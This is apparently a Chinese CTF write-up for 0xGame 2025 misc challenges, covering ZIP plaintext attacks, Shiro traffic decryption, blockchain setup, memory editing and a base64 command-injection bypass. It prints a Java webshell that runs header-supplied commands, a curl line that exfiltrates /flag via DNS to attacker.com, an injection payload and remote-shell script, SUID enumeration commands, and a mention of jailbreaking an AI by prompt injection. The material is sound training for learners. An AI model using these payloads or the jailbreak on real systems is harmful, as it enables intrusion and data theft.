我们先使用-L 查看压缩包的详细信息，发现它们是 ZipCrypto 加密方式的 Store 压缩模式，然后观察到里面就两个文件，其中一个就是我们需要利用的 png

```plain
$ bkcrack -L attachment.zip
bkcrack 1.8.0 - 2025-08-18
Archive: attachment.zip
Index Encryption Compression CRC32    Uncompressed  Packed size Name
----- ---------- ----------- -------- ------------ ------------ ----------------
    0 ZipCrypto  Store       e7b7038a           80           92 flag.txt
    1 ZipCrypto  Store       04a6dc2d     10149855     10149867 huiliyi.png
```

- step 2

接下来我们需要想办法创造 bkcrack 可以利用的明文（显然不能用上面你们直接看到的 8950 啊，这个是给我们看的，但是给 bkcrack 看的话，就要用源数据处理

```plain
$ echo 89504E470D0A1A0A0000000D49484452 | xxd -r -ps >pngheader
$ cat pngheader
�PNG
␦
IHDR
```

- step 3

接下来是直接开始明文攻击，简单说明，-C 指定的是加密压缩包，-c 指定了我们明文攻击利用的文件（我们已知部分明文的文件），-p 指定的是我们要利用的明文

这里没有给指定偏移，完全是因为我们利用的明文是 png 文件头，bkcrack 会默认从文件头也就是偏移量 0 开始进行攻击，如果需要指定偏移，需要使用-o

```plain
$ bkcrack -C attachment.zip -c huiliyi.png -p pngheader
bkcrack 1.8.0 - 2025-08-18
[13:59:25] Z reduction using 9 bytes of known plaintext
100.0 % (9 / 9)
[13:59:25] Attack on 728540 Z values at index 6
Keys: cdc564be 5675041f 719adb56
25.0 % (181808 / 728540)
Found a solution. Stopping.
You may resume the attack with the option: --continue-attack 181808
[14:00:09] Keys
cdc564be 5675041f 719adb56
```

- step 4

接下来就是拿第三步得到的 keys 进行解密，读取 flag，有多种方式

```plain
bkcrack -C attachment.zip -k cdc564be 5675041f 719adb56 -U flag.zip 123456
```

上述方式是将压缩包的密码改成 123456 重新打包，这样我们就用自己设置的密码解压即可

```plain
bkcrack -C attachment.zip -k cdc564be 5675041f 719adb56 -c flag.txt -d flag.txt && cat flag.txt
```

这个方式是直接将压缩包里面的文件进行提取，直接读

上面两个都差不多，要用到 keys 的，所以 step2 和 3 是我们进行明文攻击的关键

这里的明文攻击真的好有意思的，我为大家准备了一个稍微进阶的明文攻击题目，可以尝试解答下

[附件下载链接](https://www.ilanzou.com/s/OO9NiHas)

```text
前面的不知道，后面的也不知道，就只知道这几个明文字符，你有办法恢复出来吗？
0xGame{6?????????????mast??????????}
```

### 删库跑路

本题考察的是.git 文件泄露，这个文件夹很关键，在后面学习信息搜集、渗透、或挖漏洞的时候，如果能拿到这个文件夹，那就赚了，因为里面包含项目的更改记录，完整文件内容也在里面呢。有的时候出题师傅会将 flag 编辑后，更新过仓库再删除，那么 flag 完全可以通过日志被恢复出来

因为.git 文件夹里面的数据存储是 zilb 压缩，所以也不涉及解密什么的操作,给出一个解密照片

<img src="/img/0xgame2025/20251013231154_007.webp" alt="image-20251013212734416" style="zoom:50%;" />

但是为了更加方便快捷，直接按照仓库更新进行文件恢复，挺建议使用工具 GitTools,项目地址https://github.com/internetwache/GitTools

<img src="/img/0xgame2025/20251013231154_008.webp" alt="image-20251007160318175" style="zoom:50%;" />

Look here，发现前后只有两次更新仓库

直接锁定 main.py

<img src="/img/0xgame2025/20251013231154_009.webp" alt="image-20251007160427444" style="zoom:50%;" />

这里就是考察了下大家的代码审计能力，很轻松的，先进行凯撒加密，然后进行 xor 异或，最后是 base64 编码，我们解密的时候只需要倒过来操作即可

<img src="/img/0xgame2025/20251013231154_010.webp" alt="image-20251007162040142" style="zoom: 33%;" />

```python
#经供参考
import base64
xor_key=0x66
caser_shift=114514

def xor_bytes(data:bytes,key:int)->bytes:
	return bytes(b^key for b in data)

def caser_decrypt(text:str,shift:int) -> str:
	result=[]
	for char in text:
		if 'A' <=char<='Z':
			result.append(chr((ord(char)-ord('A')-shift)%26+ord('A')))
		elif 'a' <=char<='z':
			result.append(chr((ord(char)-ord('a')-shift)%26+ord('a')))

		else:
			result.append(char)
	return ''.join(result)

def main_decrypt():
	with open('output','r',encoding='ascii') as f:
		content=f.read().strip()
	step3_bytes=base64.b64decode(content.encode('ascii'))
	step2_bytes=xor_bytes(step3_bytes,xor_key)
	step2_str=step2_bytes.decode('utf-8')
	flag=caser_decrypt(step2_str,caser_shift)

	print(flag)

if __name__=="__main__":
	main_decrypt()
```

### ezShiro

> 基础的 shiro 流量解密还有 dns 记录

#### how to solve

下次遇到流量分析中出现 rememberMe 的时候，应当想到 shiro 加密流量，下面我仅仅讲述解题步骤

推荐在线工具https://potato.gold/navbar/tool/shiro/ShiroTool.html

*原理我会在最下面简单讲讲*

首先追踪第一个 http 流

<img src="/img/0xgame2025/20251013231155_011.webp" alt="image-20251007213345141" style="zoom:50%;" />

会看到很长的请求包

<img src="/img/0xgame2025/20251013231155_012.webp" alt="image-20251007213849145" style="zoom:50%;" />

将对应的 Cookie 复制到在线工具中，然后输入密钥`kPH+bIxk5D2deZiIxcaaaA==`（这是一种约定俗成或者说是默认的密钥，下次遇到这类题，如果密钥不对，那么可能考察的是密钥爆破，具体的问题可以自行研究

![image-20251007213827153](/img/0xgame2025/20251013231152_000.webp)

最下面出现了反编译的结果

```java
package com.summersec.x;

import java.util.Scanner;
import java.util.List;
import java.lang.reflect.Field;
import org.apache.shiro.codec.Base64;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

public class Test422640791304000 extends AbstractTranslet
{
    private static void writeBody(final Object o, final byte[] array) throws Exception {
        final byte[] bytes = new StringBuffer().append("$$$").append(Base64.encodeToString(array)).append("$$$").toString().getBytes();
        try {
            final Class forName = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
            final Object instance = forName.newInstance();
            forName.getDeclaredMethod("setBytes", byte[].class, Integer.TYPE, Integer.TYPE).invoke(instance, bytes, new Integer(0), new Integer(bytes.length));
            o.getClass().getMethod("doWrite", forName).invoke(o, instance);
        }
        catch (final Exception ex) {
            final Class forName2 = Class.forName("java.nio.ByteBuffer");
            o.getClass().getMethod("doWrite", forName2).invoke(o, forName2.getDeclaredMethod("wrap", byte[].class).invoke(forName2, bytes));
        }
    }
    
    private static Object getFV(final Object o, final String s) throws Exception {
        Field declaredField = null;
        Class clazz = o.getClass();
        while (clazz != Object.class) {
            try {
                declaredField = clazz.getDeclaredField(s);
                break;
            }
            catch (final NoSuchFieldException ex) {
                clazz = clazz.getSuperclass();
            }
        }
        if (declaredField == null) {
            throw new NoSuchFieldException(s);
        }
        declaredField.setAccessible(true);
        return declaredField.get(o);
    }
    
    public Test422640791304000() throws Exception {
        boolean b = false;
        final Thread[] array = (Thread[])getFV(Thread.currentThread().getThreadGroup(), "threads");
        for (int i = 0; i < array.length; ++i) {
            final Thread thread = array[i];
            if (thread != null) {
                final String name = thread.getName();
                if (!name.contains("exec") && name.contains("http")) {
                    final Object fv = getFV(thread, "target");
                    if (fv instanceof Runnable) {
                        Object fv2;
                        try {
                            fv2 = getFV(getFV(getFV(fv, "this$0"), "handler"), "global");
                        }
                        catch (final Exception ex) {
                            continue;
                        }
                        final List list = (List)getFV(fv2, "processors");
                        for (int j = 0; j < list.size(); ++j) {
                            final Object fv3 = getFV(list.get(j), "req");
                            final Object invoke = fv3.getClass().getMethod("getResponse", (Class[])new Class[0]).invoke(fv3, new Object[0]);
                            final String s = (String)fv3.getClass().getMethod("getHeader", String.class).invoke(fv3, new String("Host"));
                            if (s != null && !s.isEmpty()) {
                                invoke.getClass().getMethod("setStatus", Integer.TYPE).invoke(invoke, new Integer(200));
                                invoke.getClass().getMethod("addHeader", String.class, String.class).invoke(invoke, new String("Host"), s);
                                b = true;
                            }
                            final String s2 = (String)fv3.getClass().getMethod("getHeader", String.class).invoke(fv3, new String("Authorization"));
                            if (s2 != null && !s2.isEmpty()) {
                                final String decodeToString = Base64.decodeToString(s2.replaceAll("Basic ", ""));
                                writeBody(invoke, new Scanner(new ProcessBuilder(System.getProperty("os.name").toLowerCase().contains("window") ? new String[] { "cmd.exe", "/c", decodeToString } : new String[] { "/bin/sh", "-c", decodeToString }).start().getInputStream()).useDelimiter("\\A").next().getBytes());
                                b = true;
                            }
                            if (b) {
                                break;
                            }
                        }
                        if (b) {
                            break;
                        }
                    }
                }
            }
        }
    }
}
```

审计代码后，发现这个 Java🐎就干了这些事

**Header 检测:**

- 代码尝试获取 **`Host`** 头部，如果存在，则返回 `200` 状态码和 `Host` 头部，作为**连通性/身份验证**的信号。
- 代码尝试获取 **`Authorization`** 头部。

**命令执行:**

- `Base64.decodeToString(s2.replaceAll("Basic ", ""))`: 对 `Authorization` 头部的值进行 **Base64 解码**，这个解码后的字符串就是攻击者想要执行的**操作系统命令**。
- `new ProcessBuilder(...) .start()`: 根据操作系统（Windows 使用 `cmd.exe /c`，其他使用 `/bin/sh -c`），执行解码后的命令。
- **回显 (`writeBody`):** 命令执行的结果（`InputStream`）被读取，然后通过 **`writeBody`** 方法写入到 HTTP **响应体**中。
  - `writeBody` 通过反射调用容器的内部方法 (`doWrite`)，将结果用 `$$$...$$$` 封装后 **Base64 编码**发送回攻击者。

说简单点，就是 hacker 的命令会在 Authorization 部分，然后回显会用$$$...$$$包裹，里面的重要信息全用 base64 编码

下面我图上标注的够清晰了吧

![image-20251007215907167](/img/0xgame2025/20251013231153_001.webp)

> 如果对于上面的代码审计部分感觉很吃力，可以暂时放放，毕竟这个题不是一定要解密内存马才能解决的，发现上面的规律就能继续解题

流量包不多，解密的时候会看到这个的

```bash
~$ echo Y3VybCAkKGNhdCAvZmxhZyB8IHJldiB8IHRyICdBLVphLXonICdOLVpBLU1uLXphLW0nIHwgYmFzZTY0IHwgdHIgLWQgJ1xuJykuYXR0YWNrZXIuY29t | base64 -d
curl $(cat /flag | rev | tr 'A-Za-z' 'N-ZA-Mn-za-m' | base64 | tr -d '\n').attacker.com
```

这个命令的意思是访问一个子域名，然后域名的前缀是用一系列命令得到的：

`cat flag->rev(翻转输出)->进行rot13移位->base64编码->删除换行符`

解密就倒着来即可，先说说密文在哪里

我们观察到命令执行后，目标服务器上**没有产生完整的 HTTP 或 TCP 连接流量**，这表明数据没有通过传统信道（如 HTTP 回显）返回。

这是因为在流量抓包中，流量协议会将访问某个子域名的流量定义为 dns 流量，就是说服务器访问域名的时候，需要先本地进行 dns 解析，然后才能进行后续的交互，hacker 就是利用这一点，将密文给用 dns 流量传递出来了

<img src="/img/0xgame2025/20251013231155_013.webp" alt="image-20251007221525697" style="zoom:50%;" />

```plain
fTBlMXVGX2dmaFd7cnpuVGswCg==
```

解密脚本

<img src="/img/0xgame2025/20251013231156_014.webp" alt="image-20251007222539796" style="zoom:50%;" />

有个更轻松的方法

```bash
$ echo fTBlMXVGX2dmaFd7cnpuVGswCg== | base64 -d | tr 'A-Za-z' 'N-ZA-Mn-za-m' | rev
0xGame{Just_Sh1r0}
```

#### 一些拓展

> 关于 shiro 反序列化漏洞的原理以及一步一步解密，对大家来说较难，所以不做要求，可以看看

首先要对 Apache shiro 反序列化漏洞利用有所了解（通常被称为 **Shiro-550** 和 **Shiro-721** 漏洞）

该漏洞的核心在于 Apache Shiro 框架的 **“Remember Me”**（记住我）功能。

当用户勾选“记住我”登录时，Shiro 会执行以下操作：

1. 将用户的身份信息（一个实现了 `Serializable` 接口的对象，如 `Principal`）进行 **Java 序列化**。
2. 对序列化后的数据进行 **AES 加密**。
3. 对密文进行 **Base64 编码**。
4. 将最终的 Base64 字符串作为 **`rememberMe` Cookie** 的值发送给客户端。

当客户端带着这个 `rememberMe` Cookie 访问服务器时，服务器会执行逆向操作：**Base64 解码 → AES 解密 → Java 反序列化**。

攻击者利用的就是中间的 AES 加密密钥和最后的 Java 反序列化过程，来 rce 执行命令

> 如果上面有疑惑的话，对本题影响不大，推荐这个[webshell 工具](https://github.com/SummerSec/ShiroAttack2)，可以玩玩

总之，这里的解密过程就是 Base64→ AES → Java 反序列化

然后我们需要一些关键信息，比如说 AES 的密钥，在早期 shiro 框架，这个密钥是默认固定的`kPH+bIxk5D2deZiIxcaaaA==`,在正常解密 shiro 流量时，我们还需要尝试爆破密钥，但在本题中，直接拿来用即可

然后还需要 aes 加密的 iv 向量，默认是 base64 解码后的前 16 个字节

```python
import base64
from Crypto.Cipher import AES
import os

def decrypt_data(encrypted_b64, key_b64):
    try:

        encrypted_data = base64.b64decode(encrypted_b64)
        print(f"Base64解码后数据长度: {len(encrypted_data)} 字节")

        key = base64.b64decode(key_b64)
        print(f"AES密钥长度: {len(key)} 字节")

        iv = encrypted_data[:16]
        print(f"IV (十六进制): {iv.hex()}")

        actual_encrypted_data = encrypted_data[16:]
        print(f"实际加密数据长度: {len(actual_encrypted_data)} 字节")

        cipher = AES.new(key, AES.MODE_CBC, iv)

        decrypted_data = cipher.decrypt(actual_encrypted_data)

        unpadded_data = unpad_pkcs7(decrypted_data)
        
        return unpadded_data
        
    except Exception as e:
        print(f"解密过程中出现错误: {e}")
        return None

def unpad_pkcs7(data):

    padding_length = data[-1]
    return data[:-padding_length]

def save_to_file(data, filename):

    try:
        with open(filename, 'wb') as f:
            f.write(data)
        print(f"解密结果已保存到: {filename}")
        return True
    except Exception as e:
        print(f"保存文件时出现错误: {e}")
        return False

def main():
    encrypted_b64 = input("请输入base64编码的加密数据: ").strip()
    key_b64 = input("请输入base64格式的AES密钥: ").strip()
    output_filename = input("请输入输出文件名(默认: decrypted_result.bin): ").strip()
    
    if not output_filename:
        output_filename = "decrypted_result.bin"
    print("开始解密...")
    decrypted_data = decrypt_data(encrypted_b64, key_b64)
    
    if decrypted_data is not None:
        print(f"\n解密成功!")
        print(f"解密数据长度: {len(decrypted_data)} 字节")
        print(f"解密数据前16字节(十六进制): {decrypted_data[:16].hex()}")

        try:
            text_output = decrypted_data.decode('utf-8')
            print(f"文本内容预览: {text_output[:100]}...")
        except:
            print("解密结果包含二进制数据，无法显示为文本")

        if save_to_file(decrypted_data, output_filename):
            print(f"\n文件已保存为: {output_filename}")
        else:
            print("文件保存失败")
    else:
        print("解密失败")

if __name__ == "__main__":
    main()
```

这是解密后得到的文件

```bash
$ file decrypted_result.bin
decrypted_result.bin: Java serialization data, version 5
```

可以看出，这是 Java 序列化文件，是个二进制文件，不好分析，我们只能先通过反序列化处理，但是也就是这一点最难

> 可惜我还没学会这种文件的分析处理~~（在学了，在学了~~
>
> ~~所以还是回到那个在线解密工具吧~~

~~在线 shiro 解密工具https://potato.gold/navbar/tool/shiro/ShiroTool.html~~

学会咯，感谢 spreng，他教会我怎么处理一个 Java 序列化文件

![thanks](/img/0xgame2025/thanks.gif)

首先，我们可以在序列化文件中提取 class，这一步难度不大，python 脚本可以实现

```python
import javaobj


def putsMessage(obj):
    print(f"类: {obj.classdesc}")
    print(f"注解: {obj.annotations}")
    print(
        f"私有属性: {[i for i in dir(obj) if i.startswith('_') and not i.startswith('__')]}"
    )
    print(f"公有属性: {[i for i in dir(obj) if not i.startswith('_')]}")


with open("decrypted_result.bin", "rb") as f:

    parser = javaobj.JavaObjectUnmarshaller(f)
    try:
        obj = parser.readObject()
        putsMessage(obj)
        putsMessage(obj.annotations[1])

        print(len(obj.annotations[1]._bytecodes[0]))
        with open("shiro_payload_output.class", "wb") as f2:
            for i in obj.annotations[1]._bytecodes[0]:
                f2.write(int.to_bytes((i + 256) % 256, 1))

    except EOFError:
        print("文件解析完成")
```

接着，我们需要使用 crf.jar 进行反编译（神器，如果找不到，下载[我的 crf](https://www.alipan.com/s/1n8e679GWu5)

```bash
java -jar cfr.jar shiro_payload_output.class > output.java
```

反编译出来的结果很清晰

![image-20251008113818934](/img/0xgame2025/20251013231153_003.webp)

![image-20251008113835006](/img/0xgame2025/20251013231153_004.webp)

一些必要的细节都有

> 由于设备差异吧，我上面用脚本提取 class 的时候，代码已经足够清晰了，甚至下面的 crf 操作也仅仅是换了个变量名的样子，对了，我用的 python 库的名称是 javaobj-py3

### ezEXIF

> 信息伪造题目，涉及一定的图片宽高修改

先说说图片宽高吧，由于这些都是“规定”（别问我为啥是这样昂

#### 图片宽高更改

- png
- - 首先用 010 锁定 ihdr 块，然后手动编辑，width 对应的宽度，height 对应的高度，更改数字即可

<img src="/img/0xgame2025/20251013231156_015.webp" alt="image-20251008000130599" style="zoom:50%;" />

- jpg
- - 用 010 锁定 sof0 数据块，图片的宽高在这里控制，同样直接更改数字，然后保存即可

<img src="/img/0xgame2025/20251013231156_016.webp" alt="image-20251008000417847" style="zoom:50%;" />

- gif
- - 用 010 查看 LogicalScreenDescriptor，下面的 Width 和 Height 控制的就是宽高

<img src="/img/0xgame2025/20251013231156_017.webp" alt="image-20251008000700068" style="zoom:50%;" />

> 上面的三种宽高更改，某种意义上，其实并不一样，比方说 png 改变宽高，仅仅是对应的画面消失，然而其他部分没有改变，jpg 的话，一旦更改宽高，哪怕很细微，对图片的损伤也很大，里面的原由，希望大家能在学习对应的文件结构时，留意下细节，比如说 png 是一种流加密存储……

#### exif 信息篡改

不得不说，exiftool 工具最好用

```plain
exiftool -Make="Hacker" \
		 -Model="Kali linux" \
		 -DateTimeOriginal#="9999:99:99 66:66:66" \
		 -Description="motto:I can be better!"\
		 00.png
```

再将宽高更改后，提交就能拿到 flag

<img src="/img/0xgame2025/20251013231156_018.webp" alt="image-20251008002544489" style="zoom:50%;" />

### ezChain

> 最简单的上链，主要是想让新生理解区块链题目怎么上手，部署合约

正常来说，解决区块链题目，我们会至少拿到四个重要信息

第一个是 rpc 链，大部分题目应该是部署私链上进行的，需要进行网络配置

第二个是合约地址，这是我们完成挑战必须拿到的重要信息

第三个是水龙头，我们需要通过出题人提供的水龙头获取部分测试币，合约部署还有交易等，都需要 gas 费用，但是本题不太一样，会提供一个私钥，题目会自动给这个私钥的账户上充 1eth,足够后面的部署等费用了

最后就是关键的挑战合约了，sol 语法难易上还好，就那几个常用的，多见就会读会写了

#### how to solve

> 下面举例用这个环境进行

<img src="/img/0xgame2025/20251013231157_019.webp" alt="image-20251008004607202" style="zoom:33%;" />

```python
RPC_URL = "http://47.122.65.230:48334/65a7edf6-c415-4105-a26b-36f70f7913e6"
PRIVKEY = "fa7d264c487617dc552c2f0186111d321fc380762673e2ea6ce4973205ee9992"
SETUP_CONTRACT_ADDR = "0x074688F8E6f147502450B36f5eAa7CC3c3BAbA35"
WALLET_ADDR = "0x75248DebE8531030d4CDe342A5eBE8E7De5F4778"
```

- 一些准备

首先需要在浏览器上安装**`metamask`**插件，几乎每家浏览器都有这个的

![image-20251008003645578](/img/0xgame2025/20251013231153_005.webp)

接下来就是注册，创建新钱包，这些不做截图

- 配置 rpc

第一次登录，会自动连接以太主网，有两个方式：

- - 使用魔法

<img src="/img/0xgame2025/20251013231157_020.webp" alt="image-20251008004207827" style="zoom: 25%;" />

点击左上角的 Ethereum Mainnet,会进入选择网络的功能，选择添加自定义网络

- - 等待一会儿

出现切换网络.jpg(没截图)

点击后，弹窗样子和上面的那个图片是一样的

<img src="/img/0xgame2025/20251013231157_021.webp" alt="image-20251008004542515" style="zoom:50%;" />

<img src="/img/0xgame2025/20251013231157_022.webp" alt="image-20251008004720374" style="zoom:50%;" />

这里随便填，没出现红色就没错

<img src="/img/0xgame2025/20251013231157_023.webp" alt="image-20251008004823736" style="zoom:50%;" />

关于这里的链 ID，你随便输入 1 个数字，会自动弹出正确的链 id，就长这样，改回去即可

<img src="/img/0xgame2025/20251013231157_024.webp" alt="image-20251008004913872" style="zoom: 50%;" />

最后保存了，才算 rpc 配置成功

- 使用私钥添加用户

<img src="/img/0xgame2025/20251013231157_025.webp" alt="image-20251008005042952" style="zoom:50%;" />

<img src="/img/0xgame2025/20251013231157_026.webp" alt="image-20251008005104166" style="zoom:50%;" />

<img src="/img/0xgame2025/20251013231157_027.webp" alt="image-20251008005131514" style="zoom:50%;" />

将 private key 复制进去，导入即可，可以看到，已经有初始余额 1ctf 了

<img src="/img/0xgame2025/20251013231158_028.webp" alt="image-20251008005238744" style="zoom:50%;" />

- 部署合约

接下来需要使用在线 ide - [remix](https://remix.ethereum.org/)

metamask 在哪个浏览器，就在哪个浏览器上访问

新建个 sol 文件，将题目下发的 Setup.sol 复制进去，文件名也要一样的喔，这里设计合约里面的合约名，总之就是要一样

<img src="/img/0xgame2025/20251013231158_029.webp" alt="image-20251008005856453" style="zoom:50%;" />

然后进行编译，部署

<img src="/img/0xgame2025/20251013231158_030.webp" alt="image-20251008005943306" style="zoom:50%;" />

<img src="/img/0xgame2025/20251013231158_031.webp" alt="image-20251008010105311" style="zoom: 50%;" />

这里进行部署，需要先设置环境，选中浏览器插件-->Injected Provider-MetaMask 会自动关联当前钱包用户以及对应网络，然后再将合约地址复制过来，粘贴到 At Address 中，点击即可（要大致理解，我们的挑战合约应该部署到题目下发的那个地址，不然我们要是成功了，题目怎么判定呢？



{% raw %}
```liquid
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract Setup {
    bool private solved;
    string private constant WINNING_PHRASE = "welcome_to_0xGame2025";

    constructor() payable {
    }

    function solve(string memory phrase) public {
        if (keccak256(abi.encodePacked(phrase)) == keccak256(abi.encodePacked(WINNING_PHRASE))) {
            solved = true;
        } else {
            revert("Setup: Incorrect phrase.");
        }
    }

    function isSolved() external view returns (bool) {
        return solved;
    }

    receive() external payable {}
}
```
{% endraw %}




- 审计合约完成挑战

读完挑战合约，就考察了一点，就是选手需要提交一个字符串`welcome_to_0xGame2025`，只有这样，才能让 solved 返回 true，才算完成了挑战（真的是简单上链吧，算是 0xgame2025week2 的一个签到题

<img src="/img/0xgame2025/20251013231158_032.webp" alt="image-20251008011336047" style="zoom:50%;" />

<img src="/img/0xgame2025/20251013231158_033.webp" alt="image-20251008011354650" style="zoom:50%;" />

> 这是区块链上最最基础的知识（没有涉及任何区块链安全，区块链还是很有意思的，在国外赛事或国内大型赛事中会经常看到 blockchain，这个赛道相对来说，确实很新很难，如果大家后面打算专攻 misc，可以对区块链研究一二，相信会有人体会到区块链的魅力的

<div align="left">
<img src="/img/0xgame2025/20251013231159_034.webp" alt="完结撒花" style="width:30%;">
</div>


## Week3

### 神秘图书管理员

> ai 提示词注入，方法五花八门的，我这里给出我测试成功的一个案例（不保证能复现成功……

<img src="/img/0xgame2025/image-20251014132148690.png" alt="image-20251014132148690" style="zoom:50%;" />

> 这是 ai 题目中相对而言最简单的一个考法，通过创造某个情景，让 ai 越狱，跳出出题人设置的 prompt，然后大家后面想深入学习 ai 的话，建议开始上手机器学习等等，真正的难题在我看来应该是样本对抗，数据投毒，等等

### 收集阳光吧

> 本题的期望考点是用 cheat engine 这样可以更改内存值的工具，将软件中的某个值修改为指定值，直接完成挑战，但是大概率会有不少人选择逆向处理（可以的，算 ta 厉害，赖我，没好好学逆向，要是会混淆或加壳，包难住 ta 们

运行游戏以及`Cheat Engine`，点击左上角 file 下面的像电脑的图标，在弹出的`process list`中选中运行的游戏，双击就能将进程 attach 进去

<img src="/img/0xgame2025/image-20251014135650113.png" alt="image-20251014135650113" style="zoom:50%;" />

随便点击几个阳光，让 Sunshine 的值变化一下（主要是越特殊，我们越好找，一个 exe 运行的时候，内部有好多好多值，指不定会抓取到其他的变量

<img src="/img/0xgame2025/image-20251014140044121.png" alt="image-20251014140044121" style="zoom:50%;" />

将目前的值 5690 给输入到 value 中，然后点击`first scan`，会发现左侧弹出了一个地址，这就表示 cheat engine 已经找到游戏运行的内存中，存储阳光数量的内存，双击会让结果出现在最下面，再次双击数字 5690，弹出窗口，我们就可以编辑该内存的数值了

<img src="/img/0xgame2025/image-20251014140347563.png" alt="image-20251014140347563" style="zoom:50%;" />

点击 ok 后，会发现游戏收集阳光数量已经达到了 666666，再随意点击一个阳光就能弹出 flag

<img src="/img/0xgame2025/image-20251014140453663.png" alt="image-20251014140453663" style="zoom:50%;" />

这里还有其他方法或工具，比如说我们可以直接将 666666 改成 1 就好了

![image-20251014140619112](/img/0xgame2025/image-20251014140619112.png)

还有不少其他工具可以直接改动内存，比如说 x64dbg,IDA 动调等等

然后这里我补充一个正经逆向的做法

先是脱 upx 壳，然后进行 pyc 反编译,接下来就是审计代码恢复出来 flag 了，难度不大，算是 week3 的签到题好了

### base64Decoder

#### b64 绕过

本题挺考察知识储备以及细节观察的，熟悉 base64 后，使用 python 和 shell 进行 base64 解码，会发现两个解释器会有一定的区别

![image-20251014171458687](/img/0xgame2025/image-20251014171458687.png)

就像上面截图，可以观察到 shell 的 base64 解密工具会灵活将所有编码进行解码，也就是说它认定要解码的内容一直到最后一个字符，然后关注 python 的 base64 库，会发现它遇到=号填充的时候停止继续读取

<img src="/img/0xgame2025/image-20251014213400430.png" alt="image-20251014213400430" style="zoom:50%;" />

关注这部分核心函数，会发现容器先是进行 python 的 base64 库的解码，会对解码的值进行正则匹配，只能出现字母，数字，下划线，而这也就意味着我们不能输入带参数的命令（空格就绕不开

但是转折点又来了，最后执行解码命令的时候，是用的系统 base64 命令，这里就能想到绕过 python 库的方法了，前后进行两个 base64 编码拼接

```bash
yolo@yolo:~$ echo "123456" | base64
MTIzNDU2Cg==
yolo@yolo:~$ echo -n "ls -la" | base64
bHMgLWxh
yolo@yolo:~$ nc nc1.ctfplus.cn 33905
Welcome to Base64 Decoder Challenge!
Please input your base64 data. I will decode it for you.
> MTIzNDU2Cg==bHMgLWxh
base64-decoded data: 123456
total 16
drwxrwxrwx 1 root root 4096 Oct 14 13:40 .
drwxr-xr-x 1 root root 4096 Oct 14 13:38 ..
-rwxr-xr-x 1 root root 1596 Oct  4 07:31 app.py
-rw-r--r-- 1 ctf  ctf    20 Oct 14 15:01 tmpfile

>
```

这里关于创造的两串小编码，我给简单解释下下，带了-n 的那个会自动帮我们把换行符删除掉，如果不带的话，echo 会自动给我们补充换行符，这也就是为啥 6 个字母，一定会出现等号填充，（8 个字符的话就不会，具体细节参考 week2 的考法）

然后我建议接下来搓个小的交互脚本

```python
import socket
import base64
import sys

HOST = 'nc1.ctfplus.cn'
PORT = 33905
PREFIX_PAYLOAD = b'MTIzNDU2Cg==' 


def execute_command(command):

    try:
        full_command = f"{command}"
        encoded_command = base64.b64encode(full_command.encode()).decode()


        final_payload = PREFIX_PAYLOAD.decode() + encoded_command + '\n'
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))

        welcome_msg = s.recv(1024).decode()

        s.recv(1024)

        s.sendall(final_payload.encode())

        output = b''
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            output += chunk

            if output.endswith(b'> '):
                output = output[:-2] 
                break

        s.close()

        decoded_output = output.decode()

        start_tag = "base64-decoded data: "
        if start_tag in decoded_output:
            result_start = decoded_output.find(start_tag) + len(start_tag)
            result = decoded_output[result_start:].strip()

            result_lines = result.split('\n')
            if result_lines and result_lines[0].strip() == '123456':
                return '\n'.join(result_lines[1:]).strip()
            
            return result
        
        return decoded_output.strip()

    except Exception as e:
        return f"Error: {e}"

def main():
    print(f"--- CTF Pseudo-Terminal [{HOST}:{PORT}] ---")
    print("输入 'exit' 或 'quit' 退出")
    
    while True:
        try:
            cmd = input("shell> ").strip()
            
            if cmd.lower() in ['exit', 'quit']:
                print("退出终端。")
                break
            
            if not cmd:
                continue

            print("--- 命令执行中... ---")
            result = execute_command(cmd)
            print(result)

        except KeyboardInterrupt:
            print("\n退出终端。")
            break

if __name__ == '__main__':
    main()
```



> 关于 python 解释器的差异，经常用应该就会发现（之前不知道的，这次知道就好了，其实我也是现学的

#### 提权

通过这个模拟 shell，我们交互，发现根目录下的 flag 我们没有权限读取,接下来查找 suid 文件，找到了 dd，完全可以用它进行提权

```plain
find / -perm -u=s -type f 2>/dev/null
```

命令详解：

- find /
- - 文件搜索命令，从根目录开始查找
- -perm -u=s
- - -perm 是按照权限模式查找
  - -u=s：u 表示用户，s 表示“SetUID"位，-前缀表示”包含这些权限位“，不要求完全匹配
  - suid 提权是说当普通用户执行具有 suid 位程序时，程序会以文件所有者的权限运行（一般来说，系统只有 root 用户才能设置 SUID 位程序
- -type f
- - 只查找普通文件（不包括目录、设备文件等）
- 2>/dev/null
- - 错误处理，只需要记住这样做会让 Linux 输出没有任何报错信息，可以让输出更清晰

与上面类似的查找 suid 权限的命令有

```bash
find / -user root -perm -4000 -print 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
```

脚本执行部分截取：

```bash
shell> ls -la /
--- 命令执行中... ---
total 64
drwxr-xr-x    1 root root 4096 Oct 14 13:38 .
drwxr-xr-x    1 root root 4096 Oct 14 13:38 ..
drwxrwxrwx    1 root root 4096 Oct 14 13:40 app
lrwxrwxrwx    1 root root    7 Aug 24 16:20 bin -> usr/bin
drwxr-xr-x    2 root root 4096 Aug 24 16:20 boot
drwxr-xr-x    5 root root  360 Oct 14 13:38 dev
drwxr-xr-x    1 root root 4096 Oct 14 13:38 etc
-r--------    1 root root   31 Oct  3 13:39 flag
drwxr-xr-x    1 root root 4096 Oct  3 15:20 home
lrwxrwxrwx    1 root root    7 Aug 24 16:20 lib -> usr/lib
lrwxrwxrwx    1 root root    9 Aug 24 16:20 lib64 -> usr/lib64
drwxr-xr-x    2 root root 4096 Sep 29 00:00 media
drwxr-xr-x    2 root root 4096 Sep 29 00:00 mnt
drwxr-xr-x    2 root root 4096 Sep 29 00:00 opt
dr-xr-xr-x 1444 root root    0 Oct 14 13:38 proc
drwx------    1 root root 4096 Sep 30 00:32 root
drwxr-xr-x    1 root root 4096 Oct  3 15:20 run
lrwxrwxrwx    1 root root    8 Aug 24 16:20 sbin -> usr/sbin
drwxr-xr-x    2 root root 4096 Sep 29 00:00 srv
dr-xr-xr-x   13 root root    0 Oct  3 16:05 sys
drwxrwxrwt    2 root root 4096 Sep 29 00:00 tmp
drwxr-xr-x    1 root root 4096 Sep 29 00:00 usr
drwxr-xr-x    1 root root 4096 Sep 29 00:00 var
shell> find / -perm -u=s -type f 2>/dev/null
